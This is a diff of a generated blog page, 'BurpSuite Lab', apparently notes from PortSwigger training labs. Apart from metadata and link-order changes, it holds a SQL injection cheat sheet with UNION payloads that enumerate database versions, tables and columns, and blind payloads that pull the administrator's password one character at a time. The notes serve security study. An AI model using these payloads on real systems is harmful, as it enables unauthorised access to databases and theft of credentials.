@@ -57,7 +57,7 @@
 <meta name="twitter:site" content="@0xZEN2" />
 <meta name="twitter:creator" content="@Yuchao" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Yuchao"},"dateModified":"2022-05-11T22:38:52+08:00","datePublished":"2022-05-10T11:33:00+08:00","description":"sql injection","headline":"BurpSuite Lab","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/BurpSuite-Lab/"},"url":"/posts/BurpSuite-Lab/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Yuchao"},"dateModified":"2022-05-14T21:57:34+08:00","datePublished":"2022-05-10T11:33:00+08:00","description":"sql injection","headline":"BurpSuite Lab","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/BurpSuite-Lab/"},"url":"/posts/BurpSuite-Lab/"}</script>
 <!-- End Jekyll SEO tag -->
 
   
@@ -659,12 +659,12 @@
 -->
 
 <em class="timeago"
-    data-ts="1652279932"
+    data-ts="1652536654"
     
       data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll"
     
     >
-  2022-05-11
+  2022-05-14
 </em>
 
       </span>
@@ -708,8 +708,8 @@
 <h4 id="cheetsheet"><span class="mr-2">cheetsheet</span><a href="#cheetsheet" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
 <p><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">https://portswigger.net/web-security/sql-injection/cheat-sheet</a></p>
 
-<div class="language-sql highlighter-rouge"><div class="code-header">
-        <span data-label-text="Sql"><i class="fas fa-code small"></i></span>
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
@@ -738,35 +738,35 @@
 26
 27
 28
-</pre></td><td class="rouge-code"><pre><span class="s1">'+OR+1=1--
-'</span><span class="o">+</span><span class="k">UNION</span><span class="o">+</span><span class="k">SELECT</span><span class="o">+</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="c1">--</span>
+</pre></td><td class="rouge-code"><pre>'+OR+1=1--
+'+UNION+SELECT+NULL,NULL--
 
-<span class="c1">-- find columns are compatible with string data</span>
-<span class="s1">'+UNION+SELECT+'</span><span class="n">abcdef</span><span class="s1">',NULL,NULL--
+-- find columns are compatible with string data
+'+UNION+SELECT+'abcdef',NULL,NULL--
 
 -- oracle, find database type and version
-'</span><span class="o">+</span><span class="k">UNION</span><span class="o">+</span><span class="k">SELECT</span><span class="o">+</span><span class="s1">'abc'</span><span class="p">,</span><span class="s1">'def'</span><span class="o">+</span><span class="k">FROM</span><span class="o">+</span><span class="n">dual</span><span class="c1">--</span>
-<span class="s1">'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
+'+UNION+SELECT+'abc','def'+FROM+dual--
+'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
 
 -- mysql, find database type and verion
-'</span><span class="o">+</span><span class="k">UNION</span><span class="o">+</span><span class="k">SELECT</span><span class="o">+</span><span class="s1">'abc'</span><span class="p">,</span><span class="s1">'def'</span><span class="o">#</span>
-<span class="s1">'+UNION+SELECT+@@version,+NULL#
+'+UNION+SELECT+'abc','def'#
+'+UNION+SELECT+@@version,+NULL#
 
 -- list database contents, not oracle
-'</span><span class="o">+</span><span class="k">UNION</span><span class="o">+</span><span class="k">SELECT</span><span class="o">+</span><span class="k">table_name</span><span class="p">,</span><span class="o">+</span><span class="k">NULL</span><span class="o">+</span><span class="k">FROM</span><span class="o">+</span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="c1">--</span>
-<span class="s1">'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='</span><span class="n">users_abcdef</span><span class="s1">'--
+'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
+'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
 
 -- list database contents, oracle
-'</span><span class="o">+</span><span class="k">UNION</span><span class="o">+</span><span class="k">SELECT</span><span class="o">+</span><span class="k">table_name</span><span class="p">,</span><span class="k">NULL</span><span class="o">+</span><span class="k">FROM</span><span class="o">+</span><span class="n">all_tables</span><span class="c1">--</span>
-<span class="s1">'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='</span><span class="n">USERS_ABCDEF</span><span class="s1">'--
+'+UNION+SELECT+table_name,NULL+FROM+all_tables--
+'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
 
 -- blind, conditional responses
 -- "Welcome back" message disappears if error
-TrackingId=xyz'</span> <span class="k">AND</span> <span class="p">(</span><span class="k">SELECT</span> <span class="s1">'a'</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">LIMIT</span> <span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">'a
-TrackingId=xyz'</span> <span class="k">AND</span> <span class="p">(</span><span class="k">SELECT</span> <span class="s1">'a'</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s1">'administrator'</span> <span class="k">AND</span> <span class="k">LENGTH</span><span class="p">(</span><span class="n">password</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">3</span><span class="p">)</span><span class="o">=</span><span class="s1">'a
-TrackingId=xyz'</span> <span class="k">AND</span> <span class="p">(</span><span class="k">SELECT</span> <span class="k">SUBSTRING</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s1">'administrator'</span><span class="p">)</span><span class="o">=</span><span class="s1">'a
+TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)&gt;3)='a
+TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
 
-</span></pre></td></tr></tbody></table></code></div></div>
+</pre></td></tr></tbody></table></code></div></div>
 
 <h1 id="cross-site-scripting">Cross-site scripting</h1>
 
@@ -959,12 +959,12 @@ TrackingId=xyz'</span> <span class="k">AND</span> <span class="p">(</span><span 
         
         
         
-      <li><a href="/posts/cryptography/">cryptography</a></li>
+      <li><a href="/posts/BurpSuite-Lab/">BurpSuite Lab</a></li>
       
         
         
         
-      <li><a href="/posts/BurpSuite-Lab/">BurpSuite Lab</a></li>
+      <li><a href="/posts/cryptography/">cryptography</a></li>
       
         
         
